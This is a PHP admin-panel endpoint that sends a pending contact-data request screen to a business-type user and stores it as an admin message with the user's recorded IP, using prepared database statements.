<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/contacto_empresa_helpers.php';
require_once __DIR__ . '/../php_config/tela_modales_helpers.php';

verificarAuth();

$pdo = conectarBD();
$input = leerJSON();

$usuario_id = intval($input['usuario_id'] ?? 0);
$admin_id = intval($_SESSION['admin_id'] ?? 0);
$ip_usuario = trim($input['ip_usuario'] ?? 'panel');

if (!$usuario_id) {
    jsonError('ID de usuario no válido');
}

if ($admin_id < 1) {
    jsonError('Sesión de administrador no válida', 401);
}

try {
    $stmtUser = $pdo->prepare('SELECT id, apellido, ip_real FROM usuarios WHERE id = ?');
    $stmtUser->execute([$usuario_id]);
    $usuario = $stmtUser->fetch(PDO::FETCH_ASSOC);

    if (!$usuario) {
        jsonError('Usuario no encontrado', 404);
    }

    if (strcasecmp(trim($usuario['apellido'] ?? ''), 'Empresa') !== 0) {
        jsonError('La tela de contacto solo aplica para usuarios Empresas');
    }

    $ip_real = trim((string) ($usuario['ip_real'] ?? '')) ?: $ip_usuario;
    $mensajeSolicitud = contactoEmpresaMensajeSolicitud();

    cancelarTelasModalesPendientes($pdo, $usuario_id);

    $stmt = $pdo->prepare("
        INSERT INTO mensajes_admin (usuario_id, admin_id, mensaje, tipo_mensaje, ip_usuario, estado)
        VALUES (?, ?, ?, 'con_input', ?, 'pendiente')
    ");
    $stmt->execute([$usuario_id, $admin_id, $mensajeSolicitud, $ip_real]);

    jsonResponse([
        'success' => true,
        'message' => 'Tela de datos de contacto enviada',
        'mensaje_id' => (int) $pdo->lastInsertId(),
    ]);
} catch (Exception $e) {
    jsonError('Error de base de datos: ' . $e->getMessage(), 500);
}
